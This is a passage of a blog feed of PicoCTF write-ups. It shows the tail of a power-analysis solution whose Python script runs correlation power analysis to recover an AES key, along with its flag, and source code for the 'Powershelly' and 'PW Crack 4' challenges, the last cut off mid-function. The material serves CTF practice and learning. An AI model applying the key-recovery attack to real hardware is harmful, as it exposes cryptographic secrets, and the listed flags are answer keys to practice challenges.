&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">0x81&lt;/span>, &lt;span style="color:#ae81ff">0x4F&lt;/span>, &lt;span style="color:#ae81ff">0xDC&lt;/span>, &lt;span style="color:#ae81ff">0x22&lt;/span>, &lt;span style="color:#ae81ff">0x2A&lt;/span>, &lt;span style="color:#ae81ff">0x90&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xEE&lt;/span>, &lt;span style="color:#ae81ff">0xB8&lt;/span>, &lt;span style="color:#ae81ff">0x14&lt;/span>, &lt;span style="color:#ae81ff">0xDE&lt;/span>, &lt;span style="color:#ae81ff">0x5E&lt;/span>, &lt;span style="color:#ae81ff">0x0B&lt;/span>, &lt;span style="color:#ae81ff">0xDB&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE0&lt;/span>, &lt;span style="color:#ae81ff">0x32&lt;/span>, &lt;span style="color:#ae81ff">0x3A&lt;/span>, &lt;span style="color:#ae81ff">0x0A&lt;/span>, &lt;span style="color:#ae81ff">0x49&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x24&lt;/span>, &lt;span style="color:#ae81ff">0x5C&lt;/span>, &lt;span style="color:#ae81ff">0xC2&lt;/span>, &lt;span style="color:#ae81ff">0xD3&lt;/span>, &lt;span style="color:#ae81ff">0xAC&lt;/span>, &lt;span style="color:#ae81ff">0x62&lt;/span>, &lt;span style="color:#ae81ff">0x91&lt;/span>, &lt;span style="color:#ae81ff">0x95&lt;/span>, &lt;span style="color:#ae81ff">0xE4&lt;/span>, &lt;span style="color:#ae81ff">0x79&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE7&lt;/span>, &lt;span style="color:#ae81ff">0xC8&lt;/span>, &lt;span style="color:#ae81ff">0x37&lt;/span>, &lt;span style="color:#ae81ff">0x6D&lt;/span>, &lt;span style="color:#ae81ff">0x8D&lt;/span>, &lt;span style="color:#ae81ff">0xD5&lt;/span>, &lt;span style="color:#ae81ff">0x4E&lt;/span>, &lt;span style="color:#ae81ff">0xA9&lt;/span>, &lt;span style="color:#ae81ff">0x6C&lt;/span>, &lt;span style="color:#ae81ff">0x56&lt;/span>, &lt;span style="color:#ae81ff">0xF4&lt;/span>, &lt;span style="color:#ae81ff">0xEA&lt;/span>, &lt;span style="color:#ae81ff">0x65&lt;/span>, &lt;span style="color:#ae81ff">0x7A&lt;/span>, &lt;span style="color:#ae81ff">0xAE&lt;/span>, &lt;span style="color:#ae81ff">0x08&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xBA&lt;/span>, &lt;span style="color:#ae81ff">0x78&lt;/span>, &lt;span style="color:#ae81ff">0x25&lt;/span>, &lt;span style="color:#ae81ff">0x2E&lt;/span>, &lt;span style="color:#ae81ff">0x1C&lt;/span>, &lt;span style="color:#ae81ff">0xA6&lt;/span>, &lt;span style="color:#ae81ff">0xB4&lt;/span>, &lt;span style="color:#ae81ff">0xC6&lt;/span>, &lt;span style="color:#ae81ff">0xE8&lt;/span>, &lt;span style="color:#ae81ff">0xDD&lt;/span>, &lt;span style="color:#ae81ff">0x74&lt;/span>, &lt;span style="color:#ae81ff">0x1F&lt;/span>, &lt;span style="color:#ae81ff">0x4B&lt;/span>, &lt;span style="color:#ae81ff">0xBD&lt;/span>, &lt;span style="color:#ae81ff">0x8B&lt;/span>, &lt;span style="color:#ae81ff">0x8A&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x70&lt;/span>, &lt;span style="color:#ae81ff">0x3E&lt;/span>, &lt;span style="color:#ae81ff">0xB5&lt;/span>, &lt;span style="color:#ae81ff">0x66&lt;/span>, &lt;span style="color:#ae81ff">0x48&lt;/span>, &lt;span style="color:#ae81ff">0x03&lt;/span>, &lt;span style="color:#ae81ff">0xF6&lt;/span>, &lt;span style="color:#ae81ff">0x0E&lt;/span>, &lt;span style="color:#ae81ff">0x61&lt;/span>, &lt;span style="color:#ae81ff">0x35&lt;/span>, &lt;span style="color:#ae81ff">0x57&lt;/span>, &lt;span style="color:#ae81ff">0xB9&lt;/span>, &lt;span style="color:#ae81ff">0x86&lt;/span>, &lt;span style="color:#ae81ff">0xC1&lt;/span>, &lt;span style="color:#ae81ff">0x1D&lt;/span>, &lt;span style="color:#ae81ff">0x9E&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE1&lt;/span>, &lt;span style="color:#ae81ff">0xF8&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x11&lt;/span>, &lt;span style="color:#ae81ff">0x69&lt;/span>, &lt;span style="color:#ae81ff">0xD9&lt;/span>, &lt;span style="color:#ae81ff">0x8E&lt;/span>, &lt;span style="color:#ae81ff">0x94&lt;/span>, &lt;span style="color:#ae81ff">0x9B&lt;/span>, &lt;span style="color:#ae81ff">0x1E&lt;/span>, &lt;span style="color:#ae81ff">0x87&lt;/span>, &lt;span style="color:#ae81ff">0xE9&lt;/span>, &lt;span style="color:#ae81ff">0xCE&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>, &lt;span style="color:#ae81ff">0xDF&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x8C&lt;/span>, &lt;span style="color:#ae81ff">0xA1&lt;/span>, &lt;span style="color:#ae81ff">0x89&lt;/span>, &lt;span style="color:#ae81ff">0x0D&lt;/span>, &lt;span style="color:#ae81ff">0xBF&lt;/span>, &lt;span style="color:#ae81ff">0xE6&lt;/span>, &lt;span style="color:#ae81ff">0x42&lt;/span>, &lt;span style="color:#ae81ff">0x68&lt;/span>, &lt;span style="color:#ae81ff">0x41&lt;/span>, &lt;span style="color:#ae81ff">0x99&lt;/span>, &lt;span style="color:#ae81ff">0x2D&lt;/span>, &lt;span style="color:#ae81ff">0x0F&lt;/span>, &lt;span style="color:#ae81ff">0xB0&lt;/span>, &lt;span style="color:#ae81ff">0x54&lt;/span>, &lt;span style="color:#ae81ff">0xBB&lt;/span>, &lt;span style="color:#ae81ff">0x16&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">data_preprocess&lt;/span>(json_data):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ct_col = []&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> trace_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> bytes &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">16&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_pt_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tmp_ct_col = []&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace_idx &lt;span style="color:#f92672">in&lt;/span> range(len(json_data)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_pt_col&lt;span style="color:#f92672">.&lt;/span>append(json_data[trace_idx][&lt;span style="color:#e6db74">&amp;#39;pt&amp;#39;&lt;/span>][bytes])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tmp_ct_col.append(json_data[trace_idx][&amp;#39;ct&amp;#39;][bytes])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt_col&lt;span style="color:#f92672">.&lt;/span>append(tmp_pt_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ct_col.append(tmp_ct_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> point &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">300&lt;/span>, &lt;span style="color:#ae81ff">400&lt;/span>):&lt;span style="color:#75715e">#len(json_data[0][&amp;#39;pm&amp;#39;])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_trace_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace_idx &lt;span style="color:#f92672">in&lt;/span> range(len(json_data)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_trace_col&lt;span style="color:#f92672">.&lt;/span>append(json_data[trace_idx][&lt;span style="color:#e6db74">&amp;#39;pm&amp;#39;&lt;/span>][point])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> trace_col&lt;span style="color:#f92672">.&lt;/span>append(tmp_trace_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> pt_col, trace_col
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">sbox_preprocess&lt;/span>(pt_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result_tmp &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> sbox_key &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">256&lt;/span>): &lt;span style="color:#75715e"># 總共有256個sbox key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace &lt;span style="color:#f92672">in&lt;/span> range(len(pt_col)): &lt;span style="color:#75715e"># 有50個trace&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp&lt;span style="color:#f92672">.&lt;/span>append(pt_col[trace] &lt;span style="color:#f92672">^&lt;/span> sbox_key)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result_tmp&lt;span style="color:#f92672">.&lt;/span>append(tmp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> sbox_result_tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">choose_sbox&lt;/span>(sbox_result_tmp):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result &lt;span style="color:#f92672">=&lt;/span> copy&lt;span style="color:#f92672">.&lt;/span>deepcopy(sbox_result_tmp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> sbox_key &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">256&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">50&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hex_value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{0:0&amp;gt;2x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(sbox_result_tmp[sbox_key][trace])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x, y &lt;span style="color:#f92672">=&lt;/span> hex_value[&lt;span style="color:#ae81ff">0&lt;/span>], hex_value[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result[sbox_key][trace] &lt;span style="color:#f92672">=&lt;/span> s_box[int(x, &lt;span style="color:#ae81ff">16&lt;/span>)][int(y, &lt;span style="color:#ae81ff">16&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> sbox_result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">cal_hamming_weight&lt;/span>(sbox_result_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model &lt;span style="color:#f92672">=&lt;/span> copy&lt;span style="color:#f92672">.&lt;/span>deepcopy(sbox_result_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(sbox_result_col)): &lt;span style="color:#75715e"># 256&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(len(sbox_result_col[i])): &lt;span style="color:#75715e"># 50&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model[i][j] &lt;span style="color:#f92672">=&lt;/span> bin(sbox_result_col[i][j])&lt;span style="color:#f92672">.&lt;/span>count(&lt;span style="color:#e6db74">&amp;#39;1&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> hw_model
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">cal_correlation&lt;/span>(hw_model_col_result, trace_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> trange(len(hw_model_col_result)):&lt;span style="color:#75715e">#(ascii_letters + digits).encode():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(biggest_length):&lt;span style="color:#75715e">#len(trace_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result&lt;span style="color:#f92672">.&lt;/span>append(run_pearson_correlation(hw_model_col_result[i], trace_col[j]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> correlation_result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run_pearson_correlation&lt;/span>(x, y):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mean_x &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>mean(x)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mean_y &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>mean(y)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> covariance &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sum((x &lt;span style="color:#f92672">-&lt;/span> mean_x) &lt;span style="color:#f92672">*&lt;/span> (y &lt;span style="color:#f92672">-&lt;/span> mean_y))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> std_dev_x &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sqrt(np&lt;span style="color:#f92672">.&lt;/span>sum((x &lt;span style="color:#f92672">-&lt;/span> mean_x)&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> std_dev_y &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sqrt(np&lt;span style="color:#f92672">.&lt;/span>sum((y &lt;span style="color:#f92672">-&lt;/span> mean_y)&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation &lt;span style="color:#f92672">=&lt;/span> covariance &lt;span style="color:#f92672">/&lt;/span> (std_dev_x &lt;span style="color:#f92672">*&lt;/span> std_dev_y)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> correlation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">display_pt&lt;/span>(offset:int, data_offset &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">0&lt;/span>, len(j[&lt;span style="color:#ae81ff">0&lt;/span>][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>]))):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>plot(range(data_offset[&lt;span style="color:#ae81ff">0&lt;/span>], data_offset[&lt;span style="color:#ae81ff">1&lt;/span>]), j[offset][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>][data_offset[&lt;span style="color:#ae81ff">0&lt;/span>]:data_offset[&lt;span style="color:#ae81ff">1&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>savefig(fname&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;./PicoCTF/Crypto/PowerAnalysis- Part 1/pt_&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(offset) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>clf()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># display_pt(1, (0, 700))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># display_pt(1)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt_col, trace_col &lt;span style="color:#f92672">=&lt;/span> data_preprocess(j)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>biggest_length &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#75715e">#len(trace_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> idx &lt;span style="color:#f92672">in&lt;/span> trange(&lt;span style="color:#ae81ff">16&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_preprocess_result &lt;span style="color:#f92672">=&lt;/span> sbox_preprocess(pt_col[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choose_sbox_result &lt;span style="color:#f92672">=&lt;/span> choose_sbox(sbox_preprocess_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model_col_result &lt;span style="color:#f92672">=&lt;/span> cal_hamming_weight(choose_sbox_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result &lt;span style="color:#f92672">=&lt;/span> cal_correlation(hw_model_col_result, trace_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key_idx &lt;span style="color:#f92672">=&lt;/span> correlation_result&lt;span style="color:#f92672">.&lt;/span>index(max(correlation_result))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># flag += (ascii_letters + digits)[key_idx // biggest_length]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> long_to_bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#f92672">+=&lt;/span> long_to_bytes(key_idx &lt;span style="color:#f92672">//&lt;/span> biggest_length)&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;The key of AES is: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> flag )
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>picoCTF{4999139026d84bf20427eb48d4edec53}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Powershelly</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---powershelly/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---powershelly/</guid><description>&lt;h1 id="picoctf---powershelly">
 PicoCTF - Powershelly
 &lt;a class="anchor" href="#picoctf---powershelly">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zh.wikipedia.org/zh-tw/PowerShell#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E6%AF%94%E8%BE%83">Powershell 命令提示字元比較&lt;/a>
&lt;a href="https://stackoverflow.com/questions/56965510/what-is-meaning-in-powershell">What is &amp;lsquo;@{}&amp;rsquo; meaning in PowerShell&lt;/a>
&lt;a href="https://stackoverflow.com/questions/28732025/what-does-mean-in-powershell">What does @() mean in Powershell?&lt;/a>
&lt;a href="https://wenyuangg.github.io/posts/python3/python-set.html">[Python] 學習使用集合 (Set)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">$input = &amp;#34;.\input.txt&amp;#34;

$out = Get-Content -Path $input
$enc = [System.IO.File]::ReadAllBytes(&amp;#34;$input&amp;#34;)
$encoding = [system.Text.Encoding]::UTF8
$total = 264
$t = ($total + 1) * 5 #1325
$numLength = ($total * 30 ) + $t # 9245
if ($out.Length -gt 5 -or $enc.count -ne $numLength)
{
 Write-Output &amp;#34;Wrong format 5&amp;#34;
 Exit
}

else
{
 for($i=0; $i -lt $enc.count ; $i++)
 {
 if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32))
 {
 Write-Output &amp;#34;Wrong format 1/0/&amp;#34;
 Exit
 }
 }
}

$blocks = @{}
for ($i=0; $i -lt $out.Length ; $i++)
{
 $r = $out[$i].Split(&amp;#34; &amp;#34;)
 if ($i -gt 0)
 {
 for ($j=0; $j -lt $r.Length ; $j++)
 {
 if ($r[$j].Length -ne 6)
 {
 Write-Output &amp;#34;Wrong Format 6&amp;#34; $r[$j].Length
 Exit
 }
 $blocks[$j] += $r[$j]
 }
 }
 else
 {
 for ($j=0; $j -lt $r.Length ; $j++)
 {
 if ($r[$j].Length -ne 6)
 {
 Write-Output &amp;#34;Wrong Format 6&amp;#34; $r[$j].Length
 Exit
 }
 $blocks[$j] = @()
 $blocks[$j] += $r[$j]
 }
 }

}


function Exit {
 exit
}


function Random-Gen {
 $list1 = @()
 for ($i=1; $i -lt ($blocks.count + 1); $i++)
 {
 $y = ((($i * 327) % 681 ) + 344) % 313
 $list1 += $y
 }
 return $list1
}


function Scramble {
 param (
 $block,
 $seed
 )
 $raw = [system.String]::Join(&amp;#34;&amp;#34;, $block)
 $bm = &amp;#34;10 &amp;#34; * $raw.Length
 $bm = $bm.Split(&amp;#34; &amp;#34;)
 for ($i=0; $i -lt $raw.Length ; $i++)
 {

 $y = ($i * $seed) % $raw.Length
 $n = $bm[$y]
 while ($n -ne &amp;#34;10&amp;#34;)
 {
 $y = ($y + 1) % $raw.Length
 $n = $bm[$y]
 }
 if ($raw[$i] -eq &amp;#34;1&amp;#34; )
 {
 $n = &amp;#34;11&amp;#34;
 }
 else
 {
 $n = &amp;#34;00&amp;#34;
 }
 $bm[$y] = $n
 }
 $raw2 = [system.String]::Join(&amp;#34;&amp;#34;, $bm)
 $b = [convert]::ToInt64($raw2,2)
 return $b
}


$result = 0
$seeds = @()
for ($i=1; $i -lt ($blocks.count +1); $i++)
{
 $seeds += ($i * 127) % 500
}

$randoms = Random-Gen
$output_file = @()
for ($i=0; $i -lt $blocks.count ; $i++)
{

 $fun = Scramble -block $blocks[$i] -seed $seeds[$i]
 if($i -eq 263)
 {
 Write-Output $seeds[$i]
 Write-Output $randoms[$i]
 Write-Output $fun
 }
 $result = $fun -bxor $result -bxor $randoms[$i]
 $output_file += $result
}
Add-Content -Path output_test.txt -Value $output_file
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - PW Crack 4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---pw-crack-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---pw-crack-4/</guid><description>&lt;h1 id="picoctf---pw-crack-4">
 PicoCTF - PW Crack 4
 &lt;a class="anchor" href="#picoctf---pw-crack-4">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skills">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skills&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skills">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/248?category=5&amp;amp;page=2">PW Crack 4&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import hashlib

### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
 #extend key to secret length
 new_key = key
 i = 0
 while len(new_key) &amp;lt; len(secret):
 new_key = new_key + key[i]
 i = (i + 1) % len(key) 
 return &amp;#34;&amp;#34;.join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open(&amp;#39;level4.flag.txt.enc&amp;#39;, &amp;#39;rb&amp;#39;).read()
correct_pw_hash = open(&amp;#39;level4.hash.bin&amp;#39;, &amp;#39;rb&amp;#39;).read()


def hash_pw(pw_str):
 pw_bytes = bytearray()
 pw_bytes.extend(pw_str.encode())
 m = hashlib.md5()
 m.update(pw_bytes)
 return m.digest()


def level_4_pw_check():
 user_pw = input(&amp;#34;Please enter correct password for flag: &amp;#34;)
